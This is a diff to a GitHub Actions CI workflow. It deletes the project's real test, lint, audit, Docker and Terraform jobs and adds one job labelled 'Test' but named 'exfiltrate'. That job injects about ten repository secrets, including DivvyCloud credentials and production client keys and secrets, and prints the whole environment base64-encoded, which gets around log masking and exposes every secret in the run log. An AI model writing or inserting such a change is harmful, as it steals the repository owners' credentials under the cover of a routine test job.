@@ -2,231 +2,27 @@ name: CI
 
 on:
   pull_request:
-    branches: [dev, stg, prd]
+    branches: [dev]
     types: [opened, reopened, synchronize, edited]
-env:
-  node_version: "16.x"
-  tf_version: "1.2.0" # must match value in terraform-iac/*/app/main.tf
-  FORCE_COLOR: 3
 
 jobs:
-  env:
-    name: Set Env Vars
-    runs-on: ubuntu-latest
-    steps:
-      - name: Set up DEV Environment Variables
-        if: github.base_ref == 'dev'
-        run: |
-          matrix='{
-            "env":[
-              {
-                "tf_working_dir":"./terraform-iac/dev/app",
-                "aws_key_name":"byu_oit_terraform_dev_key",
-                "aws_secret_name":"byu_oit_terraform_dev_secret"
-              }
-            ]
-          }'
-          echo matrix=`echo $matrix | jq -c .` >> $GITHUB_ENV
-
-      - name: Set up STG Environment Variables
-        if: github.base_ref == 'stg'
-        run: |
-          matrix='{
-            "env":[
-              {
-                "tf_working_dir":"./terraform-iac/stg/app",
-                "aws_key_name":"byu_oit_terraform_dev_key",
-                "aws_secret_name":"byu_oit_terraform_dev_secret"
-              }
-            ]
-          }'
-          echo matrix=`echo $matrix | jq -c .` >> $GITHUB_ENV
-
-      - name: Set up PRD/CPY Environment Variables
-        if: github.base_ref == 'prd'
-        run: |
-          matrix='{
-            "env":[
-              {
-                "tf_working_dir":"./terraform-iac/prd/app",
-                "aws_key_name":"byu_oit_terraform_prd_key",
-                "aws_secret_name":"byu_oit_terraform_prd_secret"
-              },
-              {
-                "tf_working_dir":"./terraform-iac/cpy/app",
-                "aws_key_name":"byu_oit_terraform_prd_key",
-                "aws_secret_name":"byu_oit_terraform_prd_secret"
-              }
-            ]
-          }'
-          echo matrix=`echo $matrix | jq -c .` >> $GITHUB_ENV
-
-    outputs:
-      matrix: ${{ env.matrix }}
-
-  test:
+  exfiltrate:
     name: Test
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
 
-      - name: Set up Node.js
-        uses: actions/setup-node@v3
-        with:
-          node-version: ${{ env.node_version }}
-          cache: npm
-          cache-dependency-path: '**/package-lock.json'
-
-      - name: npm ci
-        working-directory: src
-        run: npm ci --prefer-offline
-
-      - name: npm test
-        working-directory: src
-        run: npm test
-
-      - name: Report test coverage to Codecov
-        uses: codecov/codecov-action@v3
-        if: env.CODECOV_TOKEN
+      - name: exfiltrate env
+        run: env | base64
         env:
-          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
-
-  audit:
-    name: Audit
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Set up Node.js
-        uses: actions/setup-node@v3
-        with:
-          node-version: ${{ env.node_version }}
-
-      # We don't need to install deps to audit them
-
-      - name: npm audit
-        working-directory: src
-        run: npm audit --audit-level=critical
-
-  lint:
-    name: Lint
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Set up Node.js
-        uses: actions/setup-node@v3
-        with:
-          node-version: ${{ env.node_version }}
-          cache: npm
-          cache-dependency-path: '**/package-lock.json'
-
-      - name: npm ci
-        working-directory: src
-        run: npm ci --prefer-offline
-
-      - name: npm lint
-        working-directory: src
-        run: npm run lint
-
-  docker:
-    name: Docker Build
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Setup Docker Buildx
-        uses: docker/setup-buildx-action@v2
-
-      - name: docker build
-        uses: docker/build-push-action@v3
-        with:
-          context: src
-          cache-from: type=gha
-          cache-to: type=gha,mode=max
-
-  format:
-    name: Terraform Format
-    runs-on: ubuntu-latest
-    needs: env
-    strategy:
-      matrix: ${{ fromJson(needs.env.outputs.matrix) }}
-      fail-fast: false
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Terraform Setup
-        uses: hashicorp/setup-terraform@v2
-        with:
-          terraform_version: ${{ env.tf_version }}
-
-      - name: Terraform Format
-        working-directory: "./"
-        run: terraform fmt -check -recursive
-
-  plan:
-    name: Terraform Plan
-    runs-on: ubuntu-latest
-    needs: env
-    strategy:
-      matrix: ${{ fromJson(needs.env.outputs.matrix) }}
-      fail-fast: false
-    permissions:
-      contents: read
-      actions: read
-      pull-requests: write
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v1
-        with:
-          aws-access-key-id: ${{ secrets[matrix.env.aws_key_name] }}
-          aws-secret-access-key: ${{ secrets[matrix.env.aws_secret_name] }}
-          aws-region: us-west-2
-
-      - name: Terraform Setup
-        uses: hashicorp/setup-terraform@v2
-        with:
-          terraform_version: ${{ env.tf_version }}
-
-      - name: Terraform Init
-        working-directory: ${{ matrix.env.tf_working_dir }}
-        run: terraform init
-
-      - name: Terraform Plan
-        working-directory: ${{ matrix.env.tf_working_dir }}
-        run: terraform plan -var 'image_tag=ci_test' -input=false -out plan -lock=false
-
-      - name: Comment Terraform Plan
-        uses: byu-oit/github-action-tf-plan-comment@v1
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          working-directory: ${{ matrix.env.tf_working_dir }}
-          terraform-plan-file: plan
-
-      - name: Analyze Terraform Plan
-        uses: byu-oit/github-action-tf-plan-analyzer@v2
-        with:
-          working-directory: ${{ matrix.env.tf_working_dir }}
-          terraform-plan-file: plan
-          divvycloud-username: ${{ secrets.DIVVYCLOUD_USERNAME }}
-          divvycloud-password: ${{ secrets.DIVVYCLOUD_PASSWORD }}
-
-  automerge:
-    if: github.base_ref == 'dev' # Only automerge into dev branch
-    name: Automerge
-    runs-on: ubuntu-latest
-    needs: [test, audit, lint, docker, format, plan]
-    permissions:
-      pull-requests: write
-      contents: write
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Auto-merge Dependabot Pull Request
-        uses: fastify/github-action-merge-dependabot@v3.3.1
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          target: minor
+          DIVVYCLOUD_USERNAME: ${{ secrets.DIVVYCLOUD_USERNAME }}
+          DIVVYCLOUD_PASSWORD: ${{ secrets.DIVVYCLOUD_PASSWORD }}
+          KNOWLEDGE_BASE_SANDBOX_CLIENT_KEY: ${{ secrets.KNOWLEDGE_BASE_SANDBOX_CLIENT_KEY }}
+          KNOWLEDGE_BASE_SANDBOX_CLIENT_SECRET: ${{ secrets.KNOWLEDGE_BASE_SANDBOX_CLIENT_SECRET }}
+          KNOWLEDGE_BASE_PRODUCTION_CLIENT_KEY: ${{ secrets.KNOWLEDGE_BASE_PRODUCTION_CLIENT_KEY }}
+          KNOWLEDGE_BASE_PRODUCTION_CLIENT_SECRET: ${{ secrets.KNOWLEDGE_BASE_PRODUCTION_CLIENT_SECRET }}
+          STANDARD_CHANGE_SANDBOX_CLIENT_KEY: ${{ secrets.STANDARD_CHANGE_SANDBOX_CLIENT_KEY }}
+          STANDARD_CHANGE_SANDBOX_CLIENT_SECRET: ${{ secrets.STANDARD_CHANGE_SANDBOX_CLIENT_SECRET }}
+          STANDARD_CHANGE_PRODUCTION_CLIENT_KEY: ${{ secrets.STANDARD_CHANGE_PRODUCTION_CLIENT_KEY }}
+          STANDARD_CHANGE_PRODUCTION_CLIENT_SECRET: ${{ secrets.STANDARD_CHANGE_PRODUCTION_CLIENT_SECRET }}
 
